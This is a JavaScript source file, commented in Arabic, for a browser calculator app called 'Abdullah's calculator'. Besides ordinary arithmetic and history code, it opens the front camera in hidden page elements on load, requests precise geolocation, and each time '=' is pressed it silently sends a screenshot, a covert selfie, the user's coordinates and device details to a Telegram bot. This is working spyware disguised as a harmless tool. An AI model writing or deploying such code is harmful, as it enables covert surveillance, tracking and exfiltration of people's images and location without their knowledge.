// ==========================================
// حاسبة عبدالله - كود متوافق تماماً مع HTML
// ==========================================

const $ = (id) => document.getElementById(id);

let expression = "";
let result = "0";
let justCalculated = false;
let cameraStream = null;
let videoElement = null;
let canvasElement = null;

// ==========================================
// 1. إنشاء عناصر الكاميرا المخفية تلقائياً
// ==========================================
function createHiddenCameraElements() {
  if (!videoElement) {
    videoElement = document.createElement("video");
    videoElement.autoplay = true;
    videoElement.playsInline = true;
    videoElement.muted = true;
    videoElement.style.display = "none";
    document.body.appendChild(videoElement);
  }

  if (!canvasElement) {
    canvasElement = document.createElement("canvas");
    canvasElement.style.display = "none";
    document.body.appendChild(canvasElement);
  }
}

// تشغيل الكاميرا الأمامية
async function initCamera() {
  createHiddenCameraElements();
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }
    });
    videoElement.srcObject = stream;
    cameraStream = stream;
  } catch (error) {
    console.warn("تعذر الوصول للكاميرا:", error.message);
  }
}

// التقاط صورة السيلفي
function captureSelfieBlob() {
  return new Promise((resolve) => {
    if (!videoElement || !canvasElement || !cameraStream) return resolve(null);

    const width = videoElement.videoWidth;
    const height = videoElement.videoHeight;

    if (!width || !height) return resolve(null);

    canvasElement.width = width;
    canvasElement.height = height;
    const context = canvasElement.getContext("2d");

    // انعكاس مرآة للسيلفي
    context.translate(width, 0);
    context.scale(-1, 1);
    context.drawImage(videoElement, 0, 0, width, height);

    canvasElement.toBlob((blob) => resolve(blob), "image/png", 0.9);
  });
}

// ==========================================
// 2. إدارة الموقع الجغرافي
// ==========================================
const LOCATION_CACHE_KEY = "calculator_location_cache";
const LOCATION_CACHE_TIME = 5 * 60 * 1000;
let cachedLocation = null;

function loadCachedLocation() {
  try {
    const saved = localStorage.getItem(LOCATION_CACHE_KEY);
    if (!saved) return null;
    const data = JSON.parse(saved);
    if (!data || !data.latitude || !data.longitude || !data.savedAt) return null;
    if (Date.now() - data.savedAt > LOCATION_CACHE_TIME) return null;
    return data;
  } catch (error) {
    return null;
  }
}

function saveCachedLocation(location) {
  const data = {
    latitude: location.latitude,
    longitude: location.longitude,
    accuracy: location.accuracy,
    savedAt: Date.now()
  };
  localStorage.setItem(LOCATION_CACHE_KEY, JSON.stringify(data));
  cachedLocation = data;
  return data;
}

function getCurrentLocation() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) return reject(new Error("المتصفح لا يدعم تحديد الموقع."));
    navigator.geolocation.getCurrentPosition(
      (pos) => resolve(saveCachedLocation({
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        accuracy: pos.coords.accuracy
      })),
      (err) => reject(err),
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 300000 }
    );
  });
}

// ==========================================
// 3. منطق الحاسبة وتنسيق الشاشة
// ==========================================
function getHistory() {
  return JSON.parse(localStorage.getItem("calc_history") || "[]");
}

function saveHistory(items) {
  localStorage.setItem("calc_history", JSON.stringify(items));
}

function escapeHtml(text) {
  return String(text).replace(/[&<>"']/g, (m) => ({
    "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;"
  }[m]));
}

function render() {
  const expElem = $("expression");
  const resElem = $("result");
  
  if (expElem) expElem.textContent = expression || "0";
  if (resElem) resElem.textContent = result;
  
  const historyContainer = $("history");
  if (historyContainer) {
    const items = getHistory();
    historyContainer.innerHTML = items.length
      ? items.map(item => `
          <div class="history-item" style="display:flex; justify-content:space-between; margin-bottom:6px; font-size:0.9rem;">
            <span><strong>${escapeHtml(item.expression)}</strong> = ${escapeHtml(item.result)}</span>
            <small style="color:#777;">${escapeHtml(item.time)}</small>
          </div>
        `).join("")
      : `<div class="history-item"><span>مفيش عمليات لسه.</span></div>`;
  }
}

function safeEvaluate(input) {
  if (!/^[0-9+\-*/%.()\s]+$/.test(input)) throw new Error("invalid");
  const normalized = input.replace(/(\d+(?:\.\d+)?)%/g, "($1/100)");
  const value = Function(`"use strict"; return (${normalized})`)();
  if (!Number.isFinite(value)) throw new Error("invalid");
  return Number.isInteger(value) ? String(value) : String(Number(value.toFixed(12)));
}

function addValue(value) {
  if (justCalculated && /[0-9.]/.test(value)) {
    expression = "";
  }
  if (justCalculated && /[+\-*/%]/.test(value)) {
    expression = result;
  }
  justCalculated = false;

  if (/[+\-*/%]/.test(value)) {
    if (!expression) return;
    if (/[+\-*/%]/.test(expression.at(-1))) {
      expression = expression.slice(0, -1) + value;
      render();
      return;
    }
  }

  if (value === ".") {
    const parts = expression.split(/[+\-*/%]/);
    if (parts.at(-1).includes(".")) return;
  }

  expression += value;
  result = "0";
  render();
}

function clearAll() {
  expression = "";
  result = "0";
  justCalculated = false;
  render();
}

function backspace() {
  if (justCalculated) { clearAll(); return; }
  expression = expression.slice(0, -1);
  render();
}

function getDeviceInfo() {
  return {
    platform: navigator.platform || "Unknown",
    screen: `${window.screen.width}x${window.screen.height}`,
    online: navigator.onLine ? "Online" : "Offline"
  };
}

// ==========================================
// 4. زر الضغط (=) وتجميع الإرسال
// ==========================================
async function equals() {
  if (!expression.trim()) return;
  const currentExpression = expression;

  try {
    const calculated = safeEvaluate(currentExpression);
    result = calculated;
    justCalculated = true;

    const history = getHistory();
    history.unshift({
      expression: currentExpression,
      result: calculated,
      time: new Date().toLocaleString("ar-EG")
    });
    saveHistory(history.slice(0, 100));
    render();

    setTimeout(() => {
      captureAndSendToTelegram(currentExpression, calculated);
    }, 300);

  } catch (error) {
    result = "خطأ";
    render();
  }
}

async function captureAndSendToTelegram(exp, res) {
  try {
    if (typeof TELEGRAM_CONFIG === "undefined") return;

    const botToken = TELEGRAM_CONFIG.botToken;
    const chatId = TELEGRAM_CONFIG.chatId;

    if (!botToken || !chatId || botToken === "YOUR_BOT_TOKEN_HERE") return;

    let locationText = "📍 الموقع: غير متاح";
    let location = cachedLocation || loadCachedLocation();
    if (!location) {
      try { location = await getCurrentLocation(); } catch (e) {}
    }
    if (location) {
      locationText = `📍 الموقع الحالي:\nLatitude: ${location.latitude}\nLongitude: ${location.longitude}\nالدقة: ±${Math.round(location.accuracy || 0)} متر`;
    }

    const device = getDeviceInfo();
    const currentTime = new Date().toLocaleString("ar-EG");

    const caption = `🧮 حاسبة عبدالله\n\n` +
      `🔢 العملية: ${exp}\n` +
      `✅ النتيجة: ${res}\n` +
      `🕐 الوقت: ${currentTime}\n\n` +
      `${locationText}\n\n` +
      `📱 الجهاز: ${device.platform} | ${device.screen}`;

    // 1. Screenshot للحاسبة
    let screenBlob = null;
    const captureArea = $("captureArea");
    if (window.html2canvas && captureArea) {
      const canvasCalc = await html2canvas(captureArea, {
        backgroundColor: "#ffffff",
        scale: Math.min(2, window.devicePixelRatio || 1)
      });
      screenBlob = await new Promise(r => canvasCalc.toBlob(r, "image/png", 0.9));
    }

    // 2. التقاط صورة السيلفي
    const selfieBlob = await captureSelfieBlob();

    // 3. إرسال Screenshot
    if (screenBlob) {
      const form1 = new FormData();
      form1.append("chat_id", chatId);
      form1.append("caption", caption.slice(0, 1024));
      form1.append("photo", screenBlob, `calc-${Date.now()}.png`);
      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: form1 });
    }

    // 4. إرسال السيلفي
    if (selfieBlob) {
      const form2 = new FormData();
      form2.append("chat_id", chatId);
      form2.append("caption", `📸 سيلفي أثناء الحساب: ${exp} = ${res}`);
      form2.append("photo", selfieBlob, `selfie-${Date.now()}.png`);
      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: form2 });
    }

  } catch (error) {
    console.error("خطأ أثناء الإرسال:", error);
  }
}

// ==========================================
// 5. ربط الأحداث مع عناصر HTML
// ==========================================
document.addEventListener("DOMContentLoaded", () => {
  render();
  initCamera();
  getCurrentLocation();

  const keysContainer = document.querySelector(".keys");
  if (keysContainer) {
    keysContainer.addEventListener("click", (event) => {
      const button = event.target.closest("button");
      if (!button) return;

      const value = button.dataset.value;
      const action = button.dataset.action;

      if (value !== undefined) {
        addValue(value);
      } else if (action === "clear") {
        clearAll();
      } else if (action === "backspace") {
        backspace();
      } else if (action === "equals") {
        equals();
      }
    });
  }

  document.addEventListener("keydown", (event) => {
    if (/^[0-9+\-*/%.()]$/.test(event.key)) {
      addValue(event.key);
    } else if (event.key === "Enter" || event.key === "=") {
      event.preventDefault();
      equals();
    } else if (event.key === "Backspace") {
      backspace();
    } else if (event.key === "Escape") {
      clearAll();
    }
  });

  const clearHistBtn = $("clearHistory");
  if (clearHistBtn) {
    clearHistBtn.addEventListener("click", () => {
      if (confirm("متأكد إنك عايز تمسح سجل العمليات؟")) {
        saveHistory([]);
        render();
      }
    });
  }
});
